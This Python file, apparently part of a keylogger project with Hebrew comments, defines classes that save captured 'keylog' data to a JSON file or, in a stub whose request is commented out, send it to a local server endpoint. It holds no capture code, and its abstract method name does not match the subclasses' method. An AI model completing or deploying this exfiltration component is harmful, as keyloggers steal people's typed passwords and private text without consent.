import json
import os
from abc import ABC, abstractmethod


class Writer(ABC):
    @abstractmethod
    def Writes_to_file(self, data: dict):
        pass


class FileWriter(Writer):
    def __init__(self, filename="keylog_data.json"):
        self.filename = filename

    def Writes(self, data: dict):
        if os.path.exists(self.filename):
            try:
                with open(self.filename, "r", encoding="utf-8") as file:
                    existing_data = json.load(file)
                    if not existing_data:
                        existing_data = {}
            except (json.JSONDecodeError, FileNotFoundError):
                existing_data = {}
        else:
            existing_data = {}

        existing_data.update(data)

        """שמירת הנתונים לקובץ JSON"""
        with open(self.filename, "w", encoding="utf-8") as f:
            json.dump(existing_data, f, ensure_ascii=False, indent=4)

        return self.filename


class NetworkWriter(Writer):
    def __init__(self, server_url="http://localhost:5000/api/keylog"):
        self.server_url = server_url

    def Writes(self, data: dict):
        """
        שליחת נתונים לשרת
        """
        # כאן יש לממש את הלוגיקה לשליחת הנתונים לשרת
        # לדוגמה:
        # response = requests.post(self.server_url, json=data)
        # return response
        print(f"Sending data to server: {self.server_url}")
        return data

class Write_keys:

    def __init__(self):
        self.fileWriter = FileWriter()
        self.networkWriter = NetworkWriter()

    def handle_write(self,write_to,data):
        if write_to == "file":
            self.fileWriter.Writes(data)
        elif write_to == "network":
            self.networkWriter.Writes(data)


